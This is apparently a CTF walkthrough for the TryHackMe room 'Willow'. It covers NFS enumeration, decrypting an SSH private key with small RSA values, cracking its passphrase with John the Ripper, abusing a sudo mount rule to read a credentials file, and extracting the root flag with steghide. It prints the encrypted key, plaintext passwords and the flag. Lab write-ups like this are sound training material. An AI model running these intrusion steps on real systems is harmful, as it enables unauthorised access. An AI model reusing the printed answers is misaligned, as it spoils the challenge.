# 31 - Willow (RSA calculator for SSH key)

Room Link --> [https://tryhackme.com/room/willow](https://tryhackme.com/room/willow)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -p- -T5 -sV -vv 10.10.243.176

# outputs
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs     2-4 (RPC #100003)
```
{% endcode %}

Opening the Webpage and we find a HEX encoded text, using cyberchef to decode it.

{% code overflow="wrap" lineNumbers="true" %}
```bash
Hey Willow, here's your SSH Private key -- you know where the decryption key is!
[..redacted..]
```
{% endcode %}

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### rpcbind enum \[111]

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap --script rpc-grind,rpcinfo 10.10.243.176 -p111

| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      37980/udp6  mountd
|   100005  1,2,3      51482/udp   mountd
|   100005  1,2,3      53265/tcp6  mountd
|   100005  1,2,3      58183/tcp   mountd
|   100021  1,3,4      44424/udp6  nlockmgr
|   100021  1,3,4      45652/udp   nlockmgr
|   100021  1,3,4      45701/tcp6  nlockmgr
|   100021  1,3,4      50990/tcp   nlockmgr
|   100024  1          49744/udp6  status
|   100024  1          52105/tcp   status
|   100024  1          55785/udp   status
|   100024  1          58486/tcp6  status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
```
{% endcode %}

#### NFS enum \[2049]

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ showmount -e 10.10.243.176      
Export list for 10.10.243.176:
/var/failsafe *

```
{% endcode %}

Mounting the NFS share.

{% code overflow="wrap" lineNumbers="true" %}
```bash
mount -t nfs 10.10.243.176:/var/failsafe /mnt/thm -o nolock

┌──(root㉿dking)-[/home/dking/Downloads]
└─# cd /mnt/thm && ls -al 
total 12
drwxr--r-- 2 nobody nogroup 4096 Jan 30  2020 .
drwxr-xr-x 3 root   root    4096 Oct 17 13:12 ..
-rw-r--r-- 1 root   root      62 Jan 30  2020 rsa_keys

┌──(root㉿dking)-[/mnt/thm]
└─# cat rsa_keys 
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)

# Looks like a clue.
```
{% endcode %}

Back to the Webserver :(

The hint said we should visit this blog --> [https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/](https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/)

At the bottom of the blog there was some code that seemed to make sense:

<figure><img src="https://miro.medium.com/v2/resize:fit:362/1*_aB1ouQQGvfU3QwUtw4QJQ.png" alt="" height="45" width="526"><figcaption></figcaption></figure>

This seemed to tie in perfectly with the information found in the NFS file:

`Public Key (e=23, n=37625)`&#x20;

`Private Key (d=61527, n=37627)`&#x20;

We use this **RSA Calculator** to decrypt the HEX values --> [https://www.cs.drexel.edu/\~jpopyack/Courses/CSP/Fa17/notes/10.1\_Cryptography/RSA\_Express\_EncryptDecrypt\_v2.html?source=post\_page-----9a0f3611283d--------------------------------](https://www.cs.drexel.edu/\~jpopyack/Courses/CSP/Fa17/notes/10.1\_Cryptography/RSA\_Express\_EncryptDecrypt\_v2.html?source=post\_page-----9a0f3611283d--------------------------------)

Just substitute the values in the appropiate box.

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And we got the key.

```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2E2F405A3529F92188B453CAA6E33270

qUVUQaJ+YmQRqto1knT5nW6m61mhTjJ1/ZBnk4H0O5jObgJoUtOQBU+hqSXzHvcX
wLbqFh2kcSbF9SHn0sVnDQOQ1pox2NnGzt2qmmsjTffh8SGQBsGncDei3EABHcv1
gTtzGjHdn+HzvYxvA6J+TMT+akCxXb2+tfA+DObXVHzYKbGAsSNeLEE2CvVZ2X92
0HBZNEvGjsDEIQtc81d33CYjYM4rhJr0mihpCM/OGT3DSFTgZ2COW+H8TCgyhSOX
SmbK1Upwbjg490TYvlMR+OQXjVJKydWFunPj9LbL/2Ut2DOgmdvboaluXq/xHYM7
q8+Ws506DXAXw3L5r9SToYWzaXiIqaVEO145BlMCSTHXMOb2HowSM/P2EHE727sJ
JJ6ykTKOH+yY2Qit09Yt9Kc/FY/yp9LzgTMCtopGhK+1cmje8Ab5h7BMB7waMUiM
YR891N+B3IIdkHPJSL6+WPtTXw5skposYpPGZSbBNMAw5VNVKyeRZJqfMJhP7iKP
d8kExORkdC2DKu3KWkxhQv3tMpLyCUUhGZBJ/29+1At78jHzMfppf13YL13O/K7K
Uhnf8sLAN51xZdefSDoEC3tGBebahh17VTLnu/21mjE76oONZ9fe/H7Y8Cp6BKh4
GknYUmh4DQ/cqGEFr+GHVNHxQ4kE1TSI/0r4WfekbHJr3+IHeTJVI52PWaCeHSLb
bO/2bSbWENgSJ3joXxxumHr4DSvZqUInqZ9/5/jkkg+DrLsEHoHe3YyVh5QVm6ke
33yhlLOvOI6mSYYNNfQ/8U/1ee+2HjQXojvb57clLuOt6+ElQWnEcFEb74NxgQ+I
DHEvVNHFGY+Z2jvCQoGb0LOV8cvVTSDXtbNQ5f/Z3bMdN3AhMN3tQmqXTAPuOI1T
BXZ1aDS6x+s6ecKjybMV/dvnohG8+dDrssV4DPyTOLntpeBkqpSNeiM4MdhxTHj1
PCkDWfBXEAEA/hfvE1oWXMNguy3vlvKn8Sk9We5fl+tEBvPjPNSWrEHksq4ZJWSz
JMEyWi/AxTnHDFiO+3m0Eovw41tdreBU2S6QbYsa9OOAiBnDmWn2m0YmAwS0636L
NJ0Ay4L+ixfYZ+F/5oVQbhvDoXnQCO58mNYqqlDVtD/21aj1+RtoYxSX2f/jxCXt
AMF890psZEugk+mhRZZ6HCvDewmBWkghrZeREEmuWAFkQWV/3gVdMpSdteWM7YIQ
MxkyUMs4jmwvA4ktznTVN1kK7VAtkIUa8+UuVUfchKpQQjwpbGgfdMrcJe55tOdk
M7mSP/jAl9bXlpyikMhrsdkVyNpFtmJU8EGJ4v5GlQzUDuySBCiwcZ7x6u3hpDG+
/+5Nf8423Dy/iAhSWAjoZD3BdkLnfbji1g4dNrJnqHnoZaZxvxs0qQEi/NcOEm4e
W0pyDdA8so0zkTTd7gm6WFarM7ywGec5rX08gT5v3dDYbPA46LJVprtA+D3ymeR4
l3xMq6RDfzFIFa6MWS8yCK67p7mPxSfqvC5NDMONQ/fz+7fO3/pjKBYZYLuchpk4
TsH6aY4QbgnEMuA+Errb/uf/5MAhWDMqLBhi42kxaXZ1e3ZMz2penCZFf/nofbLc
-----END RSA PRIVATE KEY-----
```

The hash is encrypted, we use `ssh2john` to crack the password.

{% code overflow="wrap" lineNumbers="true" %}
```bash
ssh2john id_rsa > id_hash.john
john id_hash.john --wordlist=/usr/share/wordlists/rockyou.txt

# output
wildflower       (id_rsa) 
```
{% endcode %}

We login via ssh.

`ssh -i id_rsa willow@10.10.243.176` -  and we are logged in.

`sudo -l` - and we can execute `/bin/mount /dev/*` with privileges.

Lets first see what is in /dev/:

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*-5TMxRo9Fu-0brBgRygGTA.png" alt="" height="219" width="700"><figcaption></figcaption></figure>

There is an interesting directory /hidden\_backup. Let’s mount this, but first I will create a /dev/hidden\_backup directory in Willows /Home directory/ and then mount the /dev/hidden\_backup

_**`sudo mount /dev/hidden_backup /home/willow/dev/hidden_backup/`**_

We can now navigate to the /dev/hidden\_backup in our /home directory.

{% code overflow="wrap" %}
```bash
willow@willow-tree:~$ mkdir  dev
willow@willow-tree:~$ cd dev/
willow@willow-tree:~/dev$ mkdir hidden_backup
willow@willow-tree:~/dev$ cd ..
willow@willow-tree:~$ sudo mount /dev/hidden_backup /home/willow/dev/hidden_backup/
willow@willow-tree:~$ ls /home/willow/dev/hidden_backup/
creds.txt
willow@willow-tree:~$ cat /home/willow/dev/hidden_backup/creds.txt 
root:7QvbvBTvwPspUK
willow:U0ZZJLGYhNAT2s
```
{% endcode %}

And we got creds for root.

The user flag is in the "user.jpg" file.

Turns out the root flag was hidden inside the user.jpg file also, so we use the root password and steghide tool to get the root.txt.

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ steghide extract -sf user.jpg   
Enter passphrase: 
wrote extracted data to "root.txt".
                                                                                                                 
┌──(dking㉿dking)-[~/Downloads]
└─$ cat root.txt   
THM{find_a_red_rose_on_the_grave}
```
{% endcode %}

Done !
